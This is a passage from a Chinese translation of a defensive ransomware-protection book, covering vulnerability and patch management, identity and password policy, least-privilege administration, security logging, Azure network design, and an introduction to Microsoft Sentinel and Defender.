  \  - 社交媒体 – Twitter 检查漏洞信息以从社区发现更多信息。\n  - 确定环境中哪些资产受漏洞影响。\n  - 确定更新的影响，如果有的话。如知识库文章所述，它需要重启。\n\
  - **优先排序：**\n  - 基于受影响的资产，确定应优先处理的资源。首先，如果补丁要求你重启服务器，则应在当前维护窗口之外优先处理。\n- **行动：**\n\
  \  - 实施 Microsoft 知识库文章中定义的安全补丁和额外规避措施，并基于收集到的额外社区信息\n  - 确保在不需要的服务器上禁用 Print Spooler\
  \ 服务（数据库服务器、文件服务器等）\n  - 检查资源是否已被漏洞利用\n  - 为需要该服务的机器设置 Print Spooler 服务的额外事件日志记录\n\
  - **重新评估：**\n  - 使用社区构建的脚本确定资产是否仍存在漏洞 – 例如，https://github.com/calebste wart/CVE-2021-1675\
  \ – 或其他验证安全补丁或规避措施影响的方法\n  - 查看社区和知识库文章，看看是否发现了同一漏洞中的任何更改或新利用\n- **改进：**\n  - 确定资产是否除了\
  \ Print Spooler 外还运行推荐的 Windows 服务，以减少其他 Windows 服务的攻击面\n  - 确定是否有新的处理打印方式，例如基于云的打印或第三方服务，可以使用，从而降低未来漏洞的风险\n\
  \n希望这能让你对如何构建漏洞管理框架和流程有一个概念。\n\n就确保你为所有资产打补丁而言，你首先需要查看基础设施中拥有的不同厂商和软件，并确定你运行的版本以及每个厂商的当前版本的整体状态。许多组织拥有\
  \ **软件资产管理 (SAM)** 或 IT 资产管理工具，可以提供有关基础设施上运行的软件当前版本的洞察。其中一些工具还提供补丁管理，允许你确定当前状态并对\
  \ Microsoft 和第三方服务应用补丁。\n\n我过去曾与其中一些厂商/产品合作，例如 Flexera、IBM BigFix，以及 System Center\
  \ Configuration Manager 和 Patch My PC 的组合。\n\n虽然这些工具为许多不同的操作系统和第三方应用程序提供补丁管理，但这些工具并不总是涵盖第三方核心服务，例如网络、虚拟化和备份产品，因为这些产品具有不同的生命周期，并且安装补丁需要更多工作。这意味着你需要有一种方法来确定这些服务的状态。\n\
  \n我收集更新相关信息的一种方式是使用 RSS 工具中的 RSS 源，例如 Feedly，我通常有许多不同的 RSS 源来收集更新的发行说明，例如 VMware\
  \ 和 Citrix：\n\n- VMware ESXi: `https://docs.vmware.com/en/VMware-vSphere/rn_rss.xml`\n\
  - Citrix: `https://support.citrix.com/feed/products/citrix_adc/securitybulletins.rss`\n\
  \n我们通常也为其他软件厂商有 RSS 源。RSS 是一种获取有关新更新信息的简单方法。然而，它需要我们做大量手动工作来分析收集到的信息并确定其对我们资产的影响。\n\
  \n## 身份和访问控制\n\n正如我在上一章提到的，我们看到更多涉及被盗凭据重用或利用弱密码的暴力攻击的攻击。\n\n随着大多数组织现在采用不同的 SaaS\
  \ 服务，身份正成为确保你拥有足够安全的身份验证方法的最重要部分，同时也确保你对用户账户生命周期的控制。\n\n> **注意**\n> \n> 2021 年导致美国东海岸最大燃油管道\
  \ Colonial Pipeline 停运的勒索软件攻击，是由于一个未启用 MFA 的单个被入侵用户名和密码造成的。该账户据称已不再使用，但密码在暗网上被发现。\n\
  \n用户的生命周期不再仅仅是确保用户离职后账户被禁用，还要确保对任何第三方 SaaS 服务的访问也被管理。这意味着确保在员工离职后撤销对这些第三方服务的访问。\n\
  \n大多数组织拥有不同的应用程序和服务，这些应用程序和服务仅支持某些身份提供者或身份验证协议（如 LDAP）或具有内置身份验证机制。此外，你还有不同的云服务，其中许多支持身份联合或具有内置身份验证服务：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_64_0.png)\n\n图 2.2 – 身份联合概述以及与 MFA 的集成\n\
  \n从身份和访问管理角度来看，任何安全基础的重要方面之一是控制以下内容：\n\n- 跨身份源和服务的用户生命周期管理\n- 强密码和强身份验证方法\n- 基于角色的访问控制并确保授予的访问权限使用最小权限原则\n\
  \n让我们更详细地看一下这些内容。\n\n## 用户生命周期管理\n\n当新用户入职时，用户生命周期通常从 HR 系统开始，该系统确定用户将拥有的角色类型。然后，你有一个导出作业收集此信息以在你的身份目录中创建用户。\n\
  \n在大多数情况下，此身份目录是 Active Directory，然后配置为同步用户到 Azure AD。这随后允许用户使用 Office 365 等云服务进行身份验证。\n\
  \n这听起来很简单，但我们如何与第三方应用程序集成？\n\n不建议也不总是可能直接将 Active Directory 与第三方 SaaS 服务集成；然而，Azure\
  \ AD 与大量第三方提供商有丰富的集成。\n\n此外，Azure AD 具有不同的集成，可以处理身份联合，这也允许将其用于身份验证。\n\n从生命周期角度来看，请考虑以下几点：\n\
  \n- 查看将 Azure AD 与第三方应用程序集成的用途，通过身份联合使用 SAML 或 OAuth 等协议。这意味着服务将使用 Azure AD 作为身份验证点，允许我们使用\
  \ Azure AD 中的安全机制，同时允许用户一旦经过身份验证即可使用 SSO。如果你有不支持 Azure AD 原生的服务，Microsoft 还有基于密码的\
  \ SSO 集成，使用浏览器扩展插入到用户的登录会话中。\n- 如果你使用基于云的 HR 系统，例如 **Workday** 或 **SuccessFactors**，你可以使用\
  \ Azure AD 中的内置 HR 供应服务自动为在这些 HR 系统中创建的用户进行供应。\n- 查看对支持此功能的应用程序/服务使用基于 **SCIM**\
  \ 的供应。这允许 Azure AD 自动管理这些服务中用户的生命周期。对于不支持 SCIM 的旧系统，Microsoft 还有针对使用 **SQL** 或 **LDAP**\
  \ 基于身份验证协议的系统的自定义供应程序。一些第三方服务还支持使用 API 直接与 Azure AD 集成。\n\n尽管此列表绝不全面，但 Microsoft\
  \ 对如何设置这些不同集成有相当好的文档：\n\n- 基于 SCIM 的供应：https://docs.microsoft.com/en-us/azure/active-directory/app-provisioning/on-premises-scim-provisioning\n\
  - Azure AD 和使用 SAML 的身份联合：https://docs.microsoft.com/en-us/azure/active-directory/saas-apps/tutorial-list\n\
  \n除此之外，Azure AD 还支持用于身份验证的其他身份验证协议（https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/auth-sync-overview），这为零信任架构下的身份支柱提供了良好的基础。\n\
  \n## 确保强密码和身份验证方法\n\n今天许多组织尚未在其服务中完全实施 MFA，这意味着用户可以在没有任何二次身份验证形式的情况下访问外部服务，仅凭用户名和密码。\n\
  \n幸运的是，越来越多的组织正在实施此功能。Microsoft 在 2019 年的一篇博客文章中指出，通过实施 MFA，你可以阻止 99.9% 的所有账户入侵：https://www.microsoft.com/security/blog/2019/08/20/one-simple-action-you-can-take-to-prevent-99-9-percent-of-account-attacks/。\n\
  \n\n\n\n\n大多数用户会创建易于记忆的密码，例如他们通常使用当前年份作为密码，或者只对旧密码进行小幅修改，因为许多组织强制实施严格的密码更改策略。密码重置策略多年来一直是最佳实践，但NIST发现，如果攻击者已经知道用户之前的密码，那么破解新密码并不困难。\n\
  \n此外，与复杂性相比，密码的长度更为重要；因此，你可以尝试使用易于使用的短语，而不是复杂的密码。\n\n例如，根据Bitwarden的密码强度测试工具，使用xE3r2v!1作为密码大约需要3小时才能破解。然而，如果我使用“are\
  \ you sure this is secure”这个短语，则需要几个世纪才能破解，而且对最终用户来说更容易记住。\n\n**美国国家标准与技术研究院（NIST）**\
  \ 制定了一套与数字身份相关的指南，可访问 https://pages.nist.gov/800-63-3/sp800-63-3.html 查看，其中定义了与密码相关的标准最佳实践。这是一份很长的文档，但概括来说，指南如下：\n\
  \n-   强制使用更长的密码，而不要求复杂性\n-   取消定期密码重置\n-   双因素认证不应使用短信验证码\n-   不应使用基于知识的身份验证，例如“你出生的城市叫什么名字？”\n\
  -   应允许用户在锁定前进行10次失败的密码尝试\n-   不应允许使用与上下文相关的词语\n\n需要注意的是，除此之外，我们还应该监控过度的用户登录尝试，以确保没有人试图暴力破解。我们将在*第3章“使用Microsoft\
  \ Sentinel和Defender进行安全监控”*中详细介绍这一点。\n\n在Active Directory和Azure AD中，我们可以跨基础设施和最终用户客户端为用户和管理员帐户强制执行这些类型的密码策略。此外，对于未主动使用的帐户，例如服务帐户或本地管理员帐户，我们还可以使用服务来确保每6个月定期轮换密码，相关服务如下：\n\
  \n-   **Azure AD 身份保护（AADIP）**：它利用微软在Azure AD、Microsoft帐户和Xbox等不同领域的专业知识来保护用户。AADIP生成的信息可供条件访问等工具用于做出访问决策。AADIP检测多种类型的风险，包括匿名IP地址使用、异常旅行、与恶意软件相关的IP地址、不熟悉的登录属性、泄露的凭据和密码喷洒。这些风险信号可以提示修复操作，例如强制实施MFA、启用自助密码重置或阻止访问。\n\
  -   **Azure AD 密码保护：** 这是一个Azure AD功能，可以检测并阻止Active Directory中的弱密码。它使用与Azure AD相同的全局禁用密码列表。此功能包含安装在域控制器上的代理，该代理侦听密码更改事件并确定新密码是被接受还是被拒绝：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_68_0.png)\n\n图2.3 – 在Azure AD中定义自定义禁用密码\n\
  \n此外，我们还有智能锁定功能，它决定用户在Azure AD中经过一定次数的失败登录尝试后应被锁定的时长。\n\n-   **Active Directory\
  \ 和 Azure AD 密码策略：** Active Directory 在默认域策略中有一个全局默认密码策略。此策略适用于域内的所有用户。从Server 2008及以上版本开始，你还可以选择创建可为特定用户或组定义的细粒度密码策略。需要注意的是，Azure\
  \ AD密码策略机制不适用于从本地同步的用户，除非我们在Azure AD Connect中启用**EnforceCloudPasswordPolicyForPasswordSyncedUsers**功能。\n\
  -   **Microsoft LAPS 和 CloudLAPS：** 在许多情况下，你可能需要在机器上拥有本地管理员帐户，以防AD加入设备或Azure AD加入设备出现问题时，你需要登录进行故障排除。在这些情况下，许多人在设备上使用相同的本地用户名和密码以便于记忆，但你不应该这样做。相反，请使用Microsoft\
  \ LAPS等服务，这些服务将按计划自动轮换已定义用户帐户的密码。通过确保每月轮换本地管理员帐户密码，可以降低有人尝试暴力破解这些密码的风险。如果你需要获取密码，LAPS\
  \ UI提供了一种简单的方式，在需要时显示密码，前提是你在域中具有管理员权限。对于Azure AD加入的设备，没有原生服务提供相同的功能；幸运的是，社区中有人为Azure\
  \ AD加入的设备构建了类似的服务，你可以在此处了解更多信息：https://msendpointmgr.com/cloudlaps/。\n\n实施这些功能将使我们能够确保用户获得更好的用户体验，同时仍然确保我们组织内拥有强大的密码策略。\n\
  \n## 基于角色的访问控制和使用最小权限\n\n那些拥有管理权限的人应始终确保以最小权限运行。\n\n这是为了确保在设备上发生恶意活动时，恶意代码无法利用管理员帐户的上下文执行具有管理权限的操作。这适用于端点、基础设施，甚至包括Microsoft\
  \ Azure等云平台。这一点也很重要，可以确保不可逆的操作不能在未经同意的情况下直接执行。\n\n此外，你应该有适当定义的访问控制，以确保用户只能访问他们需要的内容。\n\
  \n让我们从端点的访问控制和最小权限开始。对于端点，有一个名为**Make Me Admin**的开源工具，它允许你临时提升访问权限：https://github.com/pseymour/MakeMeAdmin。这确保用户可以使用常规访问权限运行，但允许他们在需要安装应用程序时自行提升权限。\n\
  \n还应注意，作为新的Intune Premium SKU的一部分，微软正在添加一项新的特权身份管理服务。这利用了Windows 11和Azure AD中新增的功能。用户请求提升访问权限的工作流直接通过操作系统完成。\n\
  \n如果你需要在端点上拥有管理员权限，或者帮助台需要特定访问权限来执行故障排除，他们应该有一组专门的用户，这些用户仅提供对机器的访问权限，并与其常规办公帐户分开。如果你是一个IT员工很少的小型组织，你仍然应该有在域中具有管理员权限的单独帐户，以及另一个对端点具有管理员访问权限的帐户。这样做的原因是，如果有人设法入侵了端点，他们会尝试收集机器上的本地用户帐户，或者尝试找到已登录的现有帐户并获取其凭据。\n\
  \n对于Active Directory，更高版本中提供了一些新功能，可以帮助确保我们以最小权限执行操作，例如基于时间的组成员资格。还有一些指导原则，确保管理帐户不能登录普通成员服务器。例如，应该有一个组策略，限制对域管理员帐户或其他敏感帐户的访问，该策略执行以下操作：\n\
  \n\n- 拒绝从网络访问这台计算机\n- 拒绝作为批处理作业登录\n- 拒绝作为服务登录\n- 拒绝本地登录\n- 拒绝通过远程桌面服务登录\n\n这样可以确保即使有人设法入侵了域管理员账户，也无法利用该账户通过RDP在成员服务器之间进行横向移动或直接访问服务器。同时，这也确保拥有域管理员账户的人员不会意外使用该账户（例如通过RDP）登录到其他成员服务器。\n\
  \n> **注意**\n> \n> 您还应确保域管理员账户不会同步到Azure AD，并应为管理Active Directory和Azure AD分别准备独立的账户。\n\
  \n## 安全日志记录与监控\n\n到目前为止，我们探讨了各种零信任设计原则和用户生命周期管理，以及如何确保用户采用最低权限访问。现在，让我们更深入地了解安全监控的基础——日志记录。\n\
  \n无论我们部署了多少安全机制，始终重要的是在系统中部署服务或工具来监控活动与事件，无论这些系统是本地数据中心内运行的还是云服务。一旦具备了监控能力，我们就能利用收集到的数据来寻找已知攻击迹象、异常用户活动或异常流量。\n\
  \n例如，要想全面了解进出虚拟机的流量类型，并能在操作系统内部活动的背景下查看这些流量，就需要多种日志源，例如：\n\n- 来自网络的数据（NetFlow或其他流量日志）\n\
  - 来自设备上EDR或其他工具的、用于查看服务连接流的数据\n- 来自安全事件或应用程序日志的数据\n\n然而，在构建安全监控解决方案时，我们不能简单地设置并捕获基础设施中的所有数据和事件，因为这会产生海量数据。例如，NetFlow日志或其他原始网络数据捕获将造成巨大的存储消耗。\n\
  \n我们应始终根据自身拥有的资源以及面临的安全风险数量来设计监控服务。此外，还应确定哪些攻击向量对我们的基础设施构成最大风险。\n\n让我举例说明我曾参与过的另一个客户项目。\n\
  \n对于这个客户，我们拥有许多外部服务，如Citrix、VPN，以及通过代理服务对外可用的Web应用程序。大多数服务都与Active Directory和Azure\
  \ AD集成以进行身份验证。此外，他们在办公室拥有大量不同的网络设备，并部署了集中式防火墙。终端设备也直接加入了Azure AD。\n\n我们很快确定，该组织面临的风险与公开可用的外部服务相关，例如暴力破解尝试或漏洞利用。其次，风险可能与凭据被盗或撞库攻击有关。因此，基于这些风险，我们确定了需要收集以下数据源：\n\
  \n- Active Directory安全事件\n- Azure AD登录日志和审计日志\n- 来自外部服务与身份验证尝试相关的Syslog\n- IIS错误日志\n\
  \n这些数据源随后被收集到集中式日志服务中用于分析。虽然收集正确的数据只是问题的一部分，另一部分则在于能够分析数据并知道应该寻找什么。\n\n在此，您应围绕需要监控的内容定义一些用例，例如：\n\
  \n- 针对服务发生了多少次错误身份验证尝试？（例如来自同一设备的多次失败登录尝试）\n- 谁在异常时间进行了远程登录？（例如午夜后的多次登录尝试）\n- 身份验证尝试来自何处？（例如来自不同地理位置的登录尝试）\n\
  \n一旦定义了用例，您就需要了解需要寻找哪些类型的活动来与这些用例对应。\n\n例如，如果我们要跨不同数据源查找失败的登录尝试，就需要内置一些分析功能，以便跨不同数据集进行查询：\n\
  \n| 来源 | 事件ID | 描述 |\n|---|---|---|\n| Active Directory安全事件 | 4625 | 登录尝试失败 |\n\
  | Azure AD登录日志 | 50126 | 用户名或密码无效 |\n| Citrix ADC Syslog | AAA LOGIN_FAILED | 当AAA模块无法使用户登录时\
  \ |\n\n*表 2.6 – 用于查找登录尝试的数据源示例*\n\n如果您不确定还应关注哪些其他事件，Microsoft提供的这份列表列出了您应关注的不同事件ID：https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-1--events-to-monitor。\n\
  \n对于Azure AD，Microsoft也创建了类似的要关注的事件ID列表：https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-user-accounts#unusual-sign-ins。\n\
  \n> **注意**\n> \n> 由于Microsoft没有为Azure AD中的不同事件ID及其含义创建列表，因此我在此创建了一份列表：https://github.com/msandbu/azuread/blob/main/azuread.md。\n\
  \n虽然我们可能有产品可以收集日志并进行分析，但我们仍可能拥有太多需要处理或判断是否为已知攻击模式的数据。因此，安全监控的另一个重要方面是威胁情报。\n\n威胁情报可以被视为一组包含已知攻击行为、目标和来源的数据，通常也可以作为服务集成。\n\
  \n为了收集和分析所有这些数据，我们需要某种服务或工具。根据您的需求，有许多不同的选项可供选择。虽然一些供应商只提供纯云服务，但另一些供应商则同时提供本地和基于云的服务。一些能够提供日志收集、分析和警报的产品和服务示例如下：\n\
  \n- **Splunk**：市场领导者之一，可提供本地和基于云的服务\n- **Graylog**：开源，但也提供基于云和本地服务的商业模式\n- **ELK**：开源，更侧重于纯日志收集；安全警报是附加功能\n\
  - **Sumologic**：基于云的安全信息和事件管理（SIEM）服务\n- **Humio**：基于云的日志服务\n- **Exabeam**：基于云的SIEM服务\n\
  - **Azure Sentinel**：基于云的SIEM服务\n\n虽然所有这些产品在安全监控方面都是不错的选择，但在下一章中，我们将重点讨论如何使用Azure\
  \ Sentinel作为基于云的服务，根据此处列出的用例进行日志收集和安全监控。\n\n## Microsoft Azure中的安全基础\n\n虽然我们已经涉及了大量与零信任和身份访问管理相关的内容，这些是预防勒索软件的关键因素，但我们还需要更仔细地研究如何构建安全的网络设计。\n\
  \n最常见的网络模型是基于区域的方法，即根据功能或安全性级别将网络划分为不同的分段区域。这些不同区域之间的流量通过集中式安全机制（如防火墙）进行处理。\n\n\
  此外，放置在内部区域中的这些资源不应能够直接与互联网通信。我们在勒索软件案例中看到的主要元凶之一是服务器直接暴露于互联网，并带有SSH/RDP/SMB等面向公众的服务，遭到暴力破解。另一个元凶是服务器可直接访问互联网——如果攻击者成功入侵它们，他们就能更容易地与C2服务器或文件服务通信，或者在需要下载额外载荷时实现这一点。\n\
  \n因此，建立适当的网络安全机制至少可以减缓攻击速度。这些类型的安全措施还可以减缓路过式下载（drive-by downloads），以防有人不幸尝试安装受恶意软件感染的软件。\n\
  \n因此，您还应在内部资源与互联网之间设置一个安全中枢，以确保出站流量得到控制。\n\n需要向互联网公开的服务（如Web应用程序）应始终放在安全机制之后。这是为了确保服务器不会直接暴露于互联网，同时对流量流有更多控制，并能应用更好的安全机制，例如防范已知的基于Web的攻击。\n\
  \n虽然许多人可能会认为您应具备可检查进出流量的网络安全功能，例如TLS检查（即解密流量以查看流量内容），但我们已经进入了一个使用HTTP/3等更新传输协议的时代。\n\
  \n让我们更仔细地看看如何在Microsoft Azure中构建安全的网络基础。由于许多设计原则是相同的，因此在Microsoft Azure中构建与任何其他安全网络设计架构并没有太大不同。\n\
  \n\n\n\n\n因为我们只会介绍在 Azure 中构建安全网络的主要要点，所以我们将讨论一些关于如何设计网络的思路，因为在为组织部署时有许多因素需要考虑。\n\
  \n在 Azure 中，首先，有一些主要概念和功能你应该了解：\n\n- **Azure 资源组：** 这是 Azure 中的一个逻辑容器，用于部署资源。例如，一台虚拟机将由网络卡、虚拟磁盘和虚拟机对象等不同资源组成。所有在\
  \ Azure 中创建的资源都需要属于一个资源组。\n- **VNet：** 这是 Azure 中的一个软件定义虚拟网络。作为客户，你可以在 Azure 中拥有一个或多个虚拟网络。这些虚拟网络绑定到特定的\
  \ Azure 区域，并具有定义的地址空间，例如 `10.0.0.0/16`。\n- **网络安全组 (NSG)：** 这是一组 5 元组 (IP、端口、协议)\
  \ 的防火墙规则，可以分配给子网或网络接口。\n- **NSG 流日志：** 这是一个功能，允许我们收集有关流经 NSG 的流量的日志信息（以 JSON 格式），无论是允许的流量还是被阻止的流量。然后可以将此日志信息导出到\
  \ Azure 中的不同服务，例如 Log Analytics、存储账户或 Event Hubs。\n- **用户定义路由 (UDR)：** 这是一个路由功能，允许你创建路由表，然后将其关联到一个或多个子网。\n\
  - **VNet 对等互连：** 这是一个功能，允许你将一个虚拟网络与另一个虚拟网络连接。此功能还会自动在每个虚拟网络之间传播所有路由。\n- **Azure\
  \ 防火墙：** 这是 Azure 中运行在虚拟网络的专用子网上的托管防火墙服务。此防火墙服务提供不同的安全功能，例如网络规则、应用规则、NAT 功能、TLS\
  \ 检查和 IPS 机制，具体取决于所使用的 SKU 类型。\n- **Azure 应用网关：** 这是一个在 HTTP 层运行的负载均衡服务，意味着它可以根据内容进行流量负载均衡。它还提供\
  \ Web 应用防火墙机制，可用于保护通过该服务发布的 Web 应用免受已知的 HTTP 攻击向量。\n- **Azure 云 Defender：** 这是一个基于云的威胁检测服务，可以针对\
  \ Azure 中的不同 PaaS 服务和 IaaS 提供威胁检测。例如，它可用于检测进入环境的异常流量。对于虚拟机，它提供 EDR 功能，并可通过 Microsoft\
  \ 内置服务或 Qualys 进行漏洞检测选项。\n- **Azure Bastion：** 这提供了使用 RDP 或 SSH 安全连接到虚拟机的能力，而无需将机器暴露到其公共\
  \ IP 地址。连接通过 Azure Web 门户完成。此服务还支持任何 IP 连接，意味着我们可将其用于本地资源，也提供易于管理的便利。\n- **Azure\
  \ 策略：** 这些允许我们定义中央组织策略，以确保有权访问 Azure 的人员无法在没有某些属性的情况下配置资源，或确保他们只能在特定区域内创建资源。此外，它们还可用于阻止\
  \ Azure 中的某些操作，例如阻止访问以使管理员无法为虚拟机配置公共 IP 地址。这意味着我们可以使用 Azure 策略来确保资源的治理。\n- **Azure\
  \ Log Analytics：** 这是 Azure 中的集中式日志服务，可以从 Azure 中的 PaaS 和 IaaS 服务收集日志/事件/指标。它还可用于从本地其他来源收集日志数据。这是用于\
  \ Azure Sentinel 的基础服务。\n\n除此之外，Azure 中还有一个主要编排层，称为 Azure 资源管理器。你通过 Azure 门户或 CLI/API/SDK\
  \ 执行的所有操作都是通过 Azure 资源管理器完成的。\n\n此外，要在 Azure 中设置任何资源，你需要一个活跃的订阅，即资源所链接的计费账户。然后，你需要在\
  \ Azure AD 租户中拥有一个用户账户，并且该账户对订阅具有权限，才能在 Azure 中配置任何资源。\n\n在 Microsoft Azure 中，网络流非常简单。如果你在虚拟网络中配置了一台放置在虚拟网络中的虚拟机，它默认情况下将具有互联网访问权限。对于在\
  \ Azure 中配置的每个 VNet，Microsoft 会自动为 VNet 分配一个隐藏的公共 IP，以便虚拟机可以连接到互联网。此外，放置在同一 VNet\
  \ 中的所有资源都能够相互通信，因为同一 VNet 内所有资源的路由都是自动配置的。\n\n除非我们设置了 NSG 规则禁止虚拟机与外部或同一网络上的其他机器通信，否则上述情况成立。\n\
  \n在 Azure 中设置一个扁平的虚拟网络并将所有资源放置在该网络中并不是推荐的做法。这意味着你没有正确分割流量的方式，并且控制或限制流量的唯一方式是使用 NSG\
  \ 规则，而 NSG 规则相当有限。\n\n首选的方法是使用如图下所示的 hub-and-spoke 基于拓扑：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_76_0.png)\n\
  \n图 2.5 – Microsoft Azure 中的 Hub-and-spoke 架构\n\nHub-and-spoke 架构类似于其他基于区域的设计，其中每个\
  \ spoke 都是充当独立区域的虚拟网络。Hub 通常是虚拟网络中的集中式防火墙机制，例如 Azure 防火墙或某些第三方网络虚拟设备 (NVA)。Hub 也是所有面向互联网的流量将被路由的地方，并且还将托管用于发布外部服务等其他服务，例如\
  \ Azure Web 应用防火墙。\n\n所有 spoke 都使用 VNet 对等互连连接到 hub，并且由于 VNet 对等互连是非传递的，这意味着如果 VNet\
  \ A 和 B 相连且 VNet B 和 C 相连，A 和 C 仍然无法直接相互通信。在每个 VNet 中，我们将有一个关联的 UDR，将所有指向通过集中式防火墙服务到达另一子网的流量指向，以允许不同\
  \ spoke 之间的通信。\n\n这种方法可确保不同区域之间的所有流量都由集中式防火墙服务处理，在该服务中我们可以应用流量检测和阻止。这应与应用于每个子网的\
  \ NSG 规则结合使用，以确保你在每个子网内也有分段。\n\n虽然没有一种适用于所有情况的架构和设计，但 Microsoft 提供了许多可根据你的需求或合规要求使用的参考架构。这些可以在\
  \ https://docs.microsoft.com/en-us/azure/governance/blueprints/samples/ 找到。因此，在构建\
  \ Microsoft Azure 中的安全基础时，请考虑将这些作为起点。\n\n## Summary\n\n在本章中，我们概述了一些应成为安全基础的一部分的机制，例如强大的身份验证机制、身份生命周期管理和漏洞管理。然后，我们查看了不同的零信任支柱，例如身份、设备和网络。最后，我们查看了安全监控如何帮助我们检测攻击或入侵迹象。\n\
  \n将此作为我们安全基础的一部分，可以大大降低利用弱安全凭证或漏洞的任何类型攻击的风险。\n\n在下一章中，我们将更详细地了解如何使用 Microsoft Sentinel\
  \ 和 Microsoft Defender for Cloud 设置安全监控，以提供对我们环境的更好洞察。\n\n\n\n\n"
- '# Part 2: Protect and Detect


  本部分介绍了如何确保在整个数字环境中实施不同的对策，以降低勒索软件风险，从身份终端到 SaaS 服务。它还介绍了使用不同的产品为安全基础设施提供安全见解，例如使用
  Defender for Endpoint 和 Microsoft Sentinel。


  本部分包含以下章节：


  - Chapter 3, Security Monitoring Using Microsoft Sentinel and Defender

  - Chapter 4, Ransomware Countermeasures – Windows Endpoints, Identity, and SaaS

  - Chapter 5, Ransomware Countermeasures – Microsoft Azure Workloads

  - Chapter 6, Ransomware Countermeasures – Networking and Zero-Trust Access

  - Chapter 7, Protecting Information Using Azure Information Protection and Data
  Protection

  '
- "## Security Monitoring Using Microsoft Sentinel and Defender\n\n在上一章中，我们更详细地研究了构建与网络、身份、漏洞和补丁管理相关的安全基础的一些基本部分，以及安全监控的基础知识。\n\
  \n现在，我们将重点关注如何在环境中设置安全监控，无论它是在本地运行还是在公有云中运行。我们将使用 Microsoft Sentinel、Microsoft Defender\
  \ for Endpoint 以及 Microsoft Defender for Servers，这些都是我们工具箱中用于检测环境中异常活动的有用工具。我们将更详细地研究这些服务的工作原理以及如何使用它们，然后更详细地研究\
  \ Microsoft Defender 以及它为漏洞管理提供的一些功能。\n\n在本章中，我们将涵盖以下主题：\n\n- Understanding Microsoft\
  \ Sentinel and Microsoft Defender\n- Designing and implementing Microsoft Sentinel\n\
  - Using Kusto to query data logs\n- Creating analytics rules in Sentinel\n- Vulnerability\
  \ monitoring using Microsoft Defender\n\n### Technical requirements\n\n在本章中，我们将重点关注为安全监控配置\
  \ Microsoft Sentinel 和 Microsoft Defender。要完成本章中描述的部分演练，您需要以下内容：\n\n数据是通过以下任一方式收集到工作区中的：\n\
  \n- 启用 Azure 服务的诊断设置\n- 在 VM 上安装 Azure Monitor Agent 或 Log Analytics agent，例如 Windows\
  \ 或 Linux\n- 在 Microsoft Sentinel 中为原生 Microsoft 服务（如 Intune、Azure AD）和第三方服务启用数据连接器\n\
  - 通过 HTTP Data Collector API 上传自定义数据\n\n下图总结了不同组件如何连接以及数据如何从不同 API 收集到工作区中。\n\n\
  Sentinel 为传统的 Log Analytics 工作区提供了额外的功能，例如计划查询，被称为 **analytics rules**。Microsoft\
  \ 还开发了使用机器学习算法检测大量数据中异常模式的分析规则；该功能称为 Fusion。我们还拥有 hunting rules，允许我们按规模对收集的数据运行预定义查询。\n\
  \n我们还可以使用 Jupyter Notebooks，这是在收集的数据上进行的基于 Python 的查询，允许我们按规模分析数据。Sentinel 还集成来自其他\
  \ Azure 服务的数据，包括 Azure Security Graph API，该 API 从所有其他 Microsoft 安全服务收集事件信息：\n\n\
  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_83_0.png)\n\n内置连接器将启用从不同服务收集数据，并为收集的给定数据集提供额外的内置功能，例如自定义查询和仪表板。\n\
  \nMicrosoft Sentinel 还支持 Syslog，可以通过运行 Linux agent 的现有机器上传。还应注意，Microsoft Sentinel\
  \ 可以收集存储在机器上的自定义日志文件，但这目前仅通过 Azure Log Analytics agent 支持。\n\nLog Analytics 作为一项服务还具有可安装的其他模块或扩展，可提供额外的监控功能，例如用于容器的\
  \ Azure Monitor、Service Map 和 Update Management，我们将在第 5 章 Ransomware Countermeasures\
  \ – Microsoft Azure Workloads 中更详细地介绍这些内容。\n\n> **Important note**\n> 在撰写本文时，有几个\
  \ agent 你应该注意，可以安装在任何 guest 机器上。你有 Azure Monitor Agent，这是新的首选 agent，支持新功能，例如自定义转换规则和\
  \ **Data Collection Rules (DCRs)**。然后，我们有 Log Analytics agent，它基于 **System Center\
  \ Operations Manager (SCOM)** 架构构建，其中数据收集在工作区级别定义。\n\n在为 Microsoft Sentinel 设置数据收集时，它会经过不同的缓存和节流机制，然后数据才会被索引并在工作区中可用。因此，请记住要有耐心，因为数据在\
  \ Microsoft Sentinel 中可用之前可能需要一些时间。\n\n当数据收集到 Microsoft Sentinel 中时，我们可以使用自定义查询使用\
  \ Kusto 查询查看不同数据集中的异常事件/流量或用户行为。Microsoft 还提供与其其他安全产品的集成。此外，还有一些内置的机器学习机制。\n\nMicrosoft\
  \ Defender 是一个更简单的服务，因为它只需要我们在每个资源级别或更高级别（如订阅级别或管理组级别）启用不同的服务即可。\n\n在撰写本文时，Microsoft\
  \ Defender 支持以下功能和平台：\n\n- Azure PaaS services.\n- Azure data services.\n- Azure\
  \ networks.\n- CSPM.\n- Microsoft Defender for Servers，它为 Linux 和 Windows 机器提供不同的安全机制，例如无文件攻击检测和漏洞管理。\n\
  - Threat Vulnerability Management for Servers，它是 Defender for Servers 的子功能，提供第三方应用程序的漏洞管理以检测，例如，是否存在已知漏洞。该功能有两种不同的选项，要么使用集成到服务中的\
  \ Qualys 服务，要么作为原生 Microsoft 功能。\n\n在此基础上，Microsoft Defender for Cloud 还可以与 Microsoft\
  \ Sentinel 集成，以便如果 Defender 检测到可疑流量并创建警报，该警报也可以在 Microsoft Sentinel 中创建。此外，Defender\
  \ 收集的所有数据也可以推送到 Sentinel 使用的 Log Analytics 工作区中。\n\n现在我们已经了解了 Microsoft Sentinel\
  \ 和 Defender 的工作原理以及服务中包含的一些功能，让我们更详细地研究 Microsoft Sentinel 的设计和实施。\n\n## Designing\
  \ and implementing Microsoft Sentinel\n\nMicrosoft Sentinel 建立在现有的 Log Analytics\
  \ 工作区之上，你可以在世界各地的不同 Azure 区域放置任意数量的工作区。应注意，使用 Log Analytics 和 Sentinel，你需要为存储在其中的每个\
  \ GB 付费，以及配置的保留时间。\n\n例如，如果你在 Microsoft Sentinel 中每天生成 10 GB 的日志，每月费用约为 $1,600，其中\
  \ $780 是 Sentinel 的费用，$882 是 Log Analytics 的费用。\n\n你可以使用 Azure 价格计算器作为衡量收集数据量的成本的好方法：`https://azure.microsoft.com/nb-no/pricing/calculator/`。\n\
